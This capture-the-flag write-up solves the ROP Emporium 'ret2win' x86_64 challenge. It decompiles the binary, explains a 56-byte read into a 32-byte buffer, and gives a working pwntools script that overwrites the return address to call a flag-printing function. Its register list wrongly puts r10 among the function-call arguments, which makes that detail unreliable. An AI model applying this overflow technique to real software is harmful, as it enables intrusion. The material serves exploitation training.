# Ret2win (x86_64)

## x86_64 architecture
### Calling convention
#### Arguments
`rdi`, `rsi`, `rdx`, `r10`, `r8`, `r9`, `stack`
#### Results
`rax`
More info: [here](https://uclibc.org/docs/psABI-x86_64.pdf)
### Frame structure
![framestructure](imgs/frame.png)

from [here](https://eli.thegreenplace.net/2011/09/06/stack-frame-layout-on-x86-64/)

## Reversing with Ghidra
### Main
```c
int main() {
  puts("ret2win by ROP Emporium");
  puts("x86_64\n");
  pwnme();
  puts("\nExiting");
  return 0;
}
```
### pwnme
```c
void pwnme() {
  char buf[32];
  
  memset(buf, 0, 0x20);
  puts("For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!");
  puts("What could possibly go wrong?");
  puts("You there, may I have your input please? And don\'t worry about null bytes, we\'re using read()!\n");
  printf("> ");
  read(0, buf, 0x38);
  puts("Thank you!");
  return;
}
```
### ret2win (target)
```c
void ret2win() {
  puts("Well done! Here\'s your flag:");
  system("/bin/cat flag.txt");
  return;
}
```

## The vuln
The `read` function reads `0x38` (`56`) bytes but the buffer is only `32` bytes long, this allows us to overflow the `buf` variable and write on the stack wherever we want (the `return address` in our case).

## The exploit
```py
from pwn import *

#
# Context
#

e = context.binary = ELF('ret2win')

#
# ROP
#

target = p64(0x00400756)

#
# Find Offset
#

io = process(e.path)
io.sendlineafter(b'> ', cyclic(0x38))
io.wait()

core = io.corefile
offset = cyclic_find(core.read(core.rsp, 4))

io.close()

info(f'Offset: {offset}')

#
# Exploit
#

payload  = b''
payload += b'A' * offset
payload += target

io = process(e.path)
io.sendlineafter(b'> ', payload)

info(io.recvall().decode())

io.close()
```